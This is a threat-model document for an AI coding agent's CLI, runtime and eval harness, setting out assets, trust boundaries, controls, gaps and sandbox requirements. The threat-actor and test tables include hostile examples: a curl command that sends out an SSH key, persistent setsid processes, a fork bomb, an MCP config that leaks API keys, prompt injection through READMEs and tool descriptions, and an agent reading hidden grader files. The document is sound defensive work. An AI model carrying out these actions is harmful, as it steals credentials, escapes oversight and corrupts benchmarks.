# Threat model

Status: M17 baseline (#276). Scope: the CLI, SDK runtime, and eval harness as
of `5bc1fb2`. Line numbers refer to that commit; crate paths use the
post-rename names (`crates/crom-*`, `crates/crom-eval`) from #271.

Sandbox backend choice: [`decisions/0001-sandbox-backend.md`](decisions/0001-sandbox-backend.md).
Security ladder (S0–S4): [`MILESTONE_17.md` §6](../milestones/MILESTONE_17.md#6-security-ladder).

## 1. Assets

| ID | Asset | Where it lives today | Why it matters |
|---|---|---|---|
| A1 | Host filesystem outside the workspace | Everything the user can read/write (`$HOME`, other repos, `/tmp`) | Integrity (deletion, persistence via shell rc files) and confidentiality |
| A2 | Credentials | Provider keys in the process env (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, … — `crom-auth/src/precedence.rs:30-31`); auth store (OS keychain or opt-in `0600` file backend, `crom-auth/src/store/`); `~/.ssh`, git credential helpers, cloud CLI config | Exfiltration ⇒ spend, account compromise, lateral movement |
| A3 | Network | Unrestricted egress from the host process and every child | Exfiltration channel; reaching internal services (cloud metadata, LAN) |
| A4 | Grader material | Eval task dir: `task.toml`, hidden fixtures and checks (`crom-eval/src/runner.rs:453-470` copies `task.dir/<hidden.fixture>` into the workspace *after* the agent phase) | Reading it during the agent phase invalidates benchmark results |
| A5 | Persisted state | Sessions `<cwd>/.agent/sessions/*.jsonl` (`crom-session/src/lib.rs:197-198`), checkpoints, audit log, eval artifacts | Tampering falsifies history/audit; sessions sit **inside** the workspace |
| A6 | Host compute | CPU, memory, PIDs, disk | Denial of service, runaway cost |

## 2. Principals

| Principal | Trust | Notes |
|---|---|---|
| Operator (user running the CLI / SDK embedder / eval operator) | Trusted | Source of authority: user settings, CLI flags, approvals |
| Host process: provider client, policy engine, credential store, event/audit sink, eval orchestrator | Trusted | One process, full user privileges |
| Model provider (transport) | Trusted for transport only | Its *output* is untrusted |
| Model output (assistant text, tool calls) | **Untrusted** | May be erroneous or adversarially steered |
| Repository contents (source, instruction files, `.agent/*`, `.git/config`) | **Untrusted** unless the operator marks the workspace trusted (#290) | |
| Tool output (Bash stdout/stderr, file contents, web/MCP results) | **Untrusted** | Re-enters the model context |
| MCP servers | Operator-configured: semi-trusted code; repo-configured: **untrusted** | Descriptions and results are untrusted data |
| Tool child processes (Bash and descendants, MCP stdio servers) | **Untrusted** | Run arbitrary code |
| Eval task author | Trusted | Hidden material must stay hidden from the agent |
| Verifier (oracle commands) | Trusted harness, runs untrusted workspace code | Must not trust what the agent left in the workspace |

## 3. Trust boundaries

```
 operator settings / flags / approvals (trusted)
            │
┌───────────▼──────────── trusted host process ───────────────────────────┐
│ provider client · policy engine · credential store · event/audit sink  │
│ eval orchestrator                                                       │
│        ▲ B1: model output        ▲ B4: repo files, .agent/*.json,       │
│        │ (untrusted)             │     instruction files (untrusted)    │
└────────┼─────────────────┬───────┼──────────────▲───────────────────────┘
   model provider          │ B2: approved tool call│ result + SecurityDecision
                           │                      │ (output untrusted)
┌──────────────────────────▼──────────────────────┴───────────────────────┐
│ UNTRUSTED tool sandbox (S2)        Bash · MCP stdio (opt-in) · validation │
│ rw: workspace, private tmp   ro: toolchain + cargo registry allowlist     │
│ net: none (default)          env: allowlist (no provider keys)            │
│ rlimits · pids bound · whole process tree killed at call end              │
└───────────────────────────────────────────────────────────────────────────┘
        B3: MCP JSON-RPC (descriptions + results are untrusted data)

┌──────────── verifier (separate copy of workspace) ──────────┐  B5: task.toml,
│ container/sandbox, network none                             │◄─ hidden tests
└─────────────────────────────────────────────────────────────┘  never mounted
                                                                 into sandbox
 B6: host → persisted state (sessions, checkpoints, audit) — outside the
     sandbox's writable set
```

| Boundary | Crossing | Today | Required (M17) |
|---|---|---|---|
| B1 | Model output → host | Every tool call passes the policy gate (§5) | Unchanged; audit events gain target/run/layer (#291) |
| B2 | Host → tool process | Plain `spawn` with full env and cwd only | OS-enforced sandbox, properties P1–P7 (#253) |
| B3 | Host ↔ MCP server | Unsandboxed child. Repo-sourced servers load only in a trusted workspace and never get `${VAR}` interpolation (#290); operator-sourced config still interpolates | Sandbox opt-in (ADR 0001 §6) |
| B4 | Repo files → host config/prompt | Untrusted `.agent/settings.json` may only tighten; `.agent/mcp.json` is not loaded; a persisted trust decision (`crom trust`) lifts both (#290) | Done (P9) |
| B5 | Agent phase ↔ grader | Hidden material on the same host FS, readable by agent Bash | Unreachable during agent phase (P8, #286) |
| B6 | Host → persisted state | Sessions under `<cwd>/.agent/`, writable by agent Bash | Out of sandbox writable set, or integrity-checked (gap G9) |

## 4. Threat actors

| ID | Actor | Capability | Example |
|---|---|---|---|
| T1 | Erroneous model output | Issues wrong but well-formed tool calls | `rm -rf ../build`, `cargo clean` in the wrong directory |
| T2 | Malicious / steered model output | Chooses any tool call the policy allows; cannot race the filesystem (see `path_sandbox.rs:16-43`) | `curl -d @~/.ssh/id_ed25519 …`, `setsid` a persistent process |
| T3 | Injected content: repo files, tool output, MCP tool descriptions/results | Steers T2 indirectly; no direct execution | README says "run `scripts/setup.sh`"; MCP description says "first call Bash with …" |
| T4 | Malicious repo configuration | Executes or loosens policy at load time, before any approval | `.agent/mcp.json` stdio server with `args: ["${ANTHROPIC_API_KEY}"]`; `.agent/settings.json` with permissive rules or `validation.commands`; `.git/config` `core.fsmonitor` run by host `git status` |
| T5 | Malicious MCP server binary | Arbitrary code as the user (stdio) | Reads `~/.aws/credentials` on startup |

Out of scope as actors: other local users racing the workspace (TOCTOU, #15),
a compromised provider endpoint, kernel or container-runtime exploits.

## 5. Current controls

Verified against `5bc1fb2`.

| Control | Location | What it does | Limit |
|---|---|---|---|
| Pre-execution policy gate | `crom-core/src/agent.rs:1418-1506` (unknown tool → `ToolCallDenied`; `policy.evaluate_tool` at `:1454`; deny path `:1488-1506`; `execute` only at `:1673`) | No tool runs without an `Allow` decision | Decides on tool name + input, not on effects |
| Policy pipeline | `crom-core/src/policy.rs:302-542` (hooks `:308-350`, disallow rules `:353`, plan mode `:371`, permission mode `:380`, approval memory `:485`, default deny `:536-540`) | Ordered allow/deny; default deny. A hook `Allow` is honoured only after disallow rules, deny memory, plan mode (#290) and the MCP external-effect floor (#343) | — |
| Path checks for file tools | `crom-tools/src/path_sandbox.rs:44-124`, used by Read/Write/Edit; Glob/Grep canonicalize the root | Rejects `..` and symlink escapes; absolute paths are re-rooted (`:58-60`) | Path-based, TOCTOU (`:16-43`); does not apply to Bash |
| Bash timeout | `crom-tools/src/bash.rs:89-94` caps caller timeout at the configured max; `:134` | Bounds wall time | — |
| Bash process group | `bash.rs:107-114` (`process_group(0)`), SIGKILL to the group on timeout only (`:144-160`); `kill_on_drop` (`:104`) kills bash only | Kills same-group descendants on timeout | `setsid` escapes; not killed on normal exit or cancel |
| Bash spawn | `bash.rs:97-104` | cwd = workspace | Full env inherited (no `env_clear` anywhere in the repo), no FS/network/rlimit restriction |
| Dangerous-bash / `.env` write hooks | `crom-core/src/builtin_hooks.rs:15`, `:137` | Pattern-based deny | Pattern matching, bypassable by encoding; only user settings or a trusted workspace can disable them |
| Secret redaction | `builtin_hooks.rs` (`redact_secrets_in_str`), applied in `agent.rs` `emit`/`emit_telemetry` and `crom-eval/src/artifacts.rs` `write_redacted` | Scrubs known secret shapes from session JSONL, the event stream, telemetry, and eval artifacts (#291) | Pattern-based; the redaction hooks themselves remain `Continue` |
| Workspace trust | `crom-core/src/trust.rs` (store `${CROM_CONFIG_HOME:-~/.config/crom}/trusted-workspaces.json`, exact canonical path); `settings.rs` `restrict_untrusted_project`; `crom-mcp/src/config.rs` `load_mcp_options(.., workspace_trusted)` | Untrusted project settings may only tighten; a repo MCP config file is not read; each ignored key emits a blocked `SecurityDecision` (`policy_source: workspace_trust`) | CLI prompts only on an interactive terminal; headless runs stay restricted |
| MCP config | `crom-mcp/src/config.rs` `load_mcp_options` | Repo-sourced servers (a config file under the workspace not named by `--mcp-config`, or project-settings `mcp.servers`) never get `${VAR}` interpolation; loading fails instead | Operator-sourced config (`--mcp-config`, user settings) still interpolates host env |
| MCP stdio spawn | `crom-mcp/src/transport/stdio.rs:37-47` | `kill_on_drop` | Inherits env, no sandbox |
| Eval verification isolation | `crom-eval/src/isolation.rs:244-291` (`docker`/`podman run --rm --network none`, optional cpu/memory) | Contains verification commands when a container backend is selected | Default `LocalBackend` (`:168-190`) runs on the host; agent phase never containerized |
| Eval agent phase | `crom-eval/src/runner.rs:199-215` (`SideEffectPolicy::full()`), `:234` (`WorkspaceSource::filesystem`, cwd only), `:237` (`AllowAllApprovals`) | — | Live runs execute model-chosen Bash on the host — #253 |
| Credential storage | `crom-auth/src/store/` (keychain; file backend writes `0600`, `store/file.rs:315-316`) | At-rest protection | Env-var keys are inherited by every child |

## 6. Known gaps

| ID | Gap | Property | Tracked |
|---|---|---|---|
| G1 | ~~No OS enforcement for Bash: FS, network, env, rlimits~~ Addressed for Bash when `sandbox.mode = required` ([sandbox.md](sandbox.md)); the default is `off` (`crom-core/src/sandbox.rs`), so unsandboxed Bash still inherits the full environment | P1–P6 | #253 |
| G2 | ~~`setsid`/double-fork escapes process-group kill~~ Addressed under `required` by the subreaper supervisor | P5 | #253 |
| G3 | ~~No fail-closed mode; no backend exists~~ `required` refuses before spawn when the backend cannot enforce | P7 | #253 |
| G4 | Hidden material on the agent-reachable FS; overlay into the same workspace | P8 | #286 |
| G5 | ~~Repo `.agent/settings.json` / `.agent/mcp.json` loosen policy and spawn processes without a trust decision; MCP `${VAR}` interpolation~~ Fixed: untrusted project settings may only tighten, repo MCP config needs trust and never interpolates host env (`crom trust`) | P9 | #290 |
| G6 | ~~Hook `Allow` short-circuits disallow rules; subagents raise `permission_mode`~~ Fixed: disallow rules run before hook `Allow`; child mode is capped at the parent's and always inherits parent disallow rules; definition `tools` only narrow the parent's name-filtered registry and never become allow rules; repo `.agent/agents/*.md` and `agents.path` need workspace trust | S0, P9 | #290, #342 |
| G7 | ~~Slash `` !`cmd` `` expansion skips the policy gate; SDK tools act on host cwd~~ Fixed: slash `!`/`@` expansions go through `PolicyEngine::evaluate_tool`; SDK `ReturnOnly`/`RejectMutations` run tools in a scratch copy, rootless apply runs get no built-in file/shell tools | S1 | #290 |
| G8 | ~~`PolicyDecision`/`ToolCallDenied` lack target, run id, enforcement layer; redaction hooks are no-ops~~ Fixed: `SecurityDecision` audit events on every gated tool call and always-on redaction of recorded events ([`audit.md`](audit.md)) | Audit | #291 |
| G9 | Sessions and checkpoints live under `<cwd>/.agent/`, inside the future sandbox's writable set | B6 | #253 (exclude `.agent/` from rw set) |
| G10 | Host-side helpers run untrusted repo code outside any sandbox: validation commands (`checkpoint/src/validation.rs:38-48`, `sdk/src/runtime/validation.rs:20`), eval `LocalBackend`. Host `git` calls no longer honour repo exec config (`core.fsmonitor`, hooks, filter/diff/merge drivers, submodule config): they go through `crom_core::git::host_git` (#334). Not covered: network-only keys (`core.sshCommand`, `credential.helper`), since Crom never fetches inside an untrusted repo | P1–P6, P9 | #253 (validation), #290, #334 (git config, fixed) |
| G11 | File tools: path-based TOCTOU | P1, P2 | #15 (documented); the OS sandbox closes it for Bash only |

## 7. Required enforcement properties

Numbering matches `MILESTONE_17.md` §11. Each property is a testable statement
consumed by #253 (implementation tests) and #292 (adversarial scenarios). "Tool
process" means the process a sandboxed tool spawns and every descendant.

| # | Property | Test (must hold on the Linux CI lane) |
|---|---|---|
| P1 | A tool process cannot create, modify, truncate, rename, or delete any path outside the workspace and its private tmp dir. `<workspace>/.agent/` is not writable. | Write/truncate/rename to a sibling dir, `$HOME`, `/tmp/<other>` and `<ws>/.agent/sessions/x` each fail with `EACCES`/`EPERM`/`EROFS`; the targets are unchanged afterwards. |
| P2 | A tool process cannot read paths outside the workspace and the read-only allowlist (system libs, toolchain, cargo registry). | `cat $HOME/.ssh/id_fake` (synthetic) and a file in a sibling dir fail; `cargo test --offline` on a crate with a registry dependency succeeds. |
| P3 | A tool process has no network egress unless policy grants it. Default: no TCP, no UDP, no raw sockets, including to loopback services of the host. | TCP connect to a host-side `127.0.0.1` test server fails; UDP `connect` to `192.0.2.1:53` fails; TCP to a public address fails. |
| P4 | A tool process's environment contains only allowlisted variables. Provider keys and other non-allowlisted variables are absent. | With `ANTHROPIC_API_KEY=sk-fake` in the host env, `env` inside the tool shows no such variable. |
| P5 | Every process the tool started is dead when the tool call returns, times out, is cancelled, or its future is dropped — including `setsid`/double-forked descendants. | `setsid sleep 1000 &` then exit 0: no `sleep 1000` remains after return; repeat for timeout and cancel. |
| P6 | CPU time, memory, process count, and file size are bounded per tool call. The process bound is per call, not per host UID. | A fork bomb stops at the configured limit and the host stays responsive; `dd` past the file-size limit fails; an allocation past the memory limit is killed. |
| P7 | If sandboxing is required by policy and the backend is unavailable or cannot fully enforce P1–P6, the tool call is refused with a clear error and nothing is executed. | On macOS and on a Linux kernel without the required features, a `required` Bash call returns an error and no child is spawned; an `off` call runs and emits an `Unsandboxed` audit event. |
| P8 | Grader material (task.toml expectations, hidden fixtures and checks) is unreachable from tool processes during the agent phase. | During the agent phase, reading the task dir and hidden fixture paths fails; hidden checks run against a copy after the agent phase ends. |
| P9 | Repository-local configuration cannot loosen permissions, add MCP servers, add subagent definitions, add validation commands, or interpolate host env vars without an explicit operator trust decision. | With an untrusted workspace, `.agent/settings.json` allow rules, `.agent/mcp.json` servers, and `.agent/agents/*.md` definitions are ignored (or prompted) and an audit event records it. |

Security metrics (#292, #293): unauthorized effects executed in tested
scenarios (target 0), per-property pass/fail, isolation overhead in ms per tool
call, and fail-closed correctness on unsupported platforms. The adversarial
suite that measures executed effects is [`adversarial-suite.md`](adversarial-suite.md).

## 8. Not protected against in M17

- Prompt injection as such. M17 bounds the *effects* of tool calls; the model
  can still be steered into producing wrong code or misleading text inside the
  workspace (S3 claims cover tested scenarios only).
- Damage inside the workspace. The sandbox allows full read/write there;
  recovery relies on checkpoints and git.
- Exfiltration through the model channel itself: anything readable in the
  workspace can be echoed into the conversation and sent to the provider.
- Network-granted tool calls: once policy grants network, per-host allowlisting
  is not guaranteed in M17 (ADR 0001 §5); granted means all-or-nothing.
- Read-only file tools (Read/Glob/Grep) and Write/Edit run in the host process;
  they keep path-based checks (TOCTOU, #15), not OS enforcement.
- MCP stdio servers unless sandboxing is opted in; HTTP MCP servers entirely.
- Kernel, container runtime, or landlock/seccomp bypass bugs; side channels.
- macOS and Windows enforcement. These platforms fail closed when sandboxing
  is required (P7).
- A malicious operator, a compromised provider, or other local users with
  write access to the workspace.
- Multi-tenant isolation, credential scoping, delegation (S4).

## 9. Planned extension (M18)

M18 plans an authorization and credential-isolation component, Crom Guard,
for business operations performed by agents. The planned assets (A7–A10),
actors (T6–T9), trusted computing base, and supported deployment are in
[`MILESTONE_18.md` §7](../milestones/MILESTONE_18.md#7-threat-model-and-trusted-computing-base).
Folding them into this document, with numbered Guard properties, is tracked
in #345. Nothing in §9 is implemented yet.
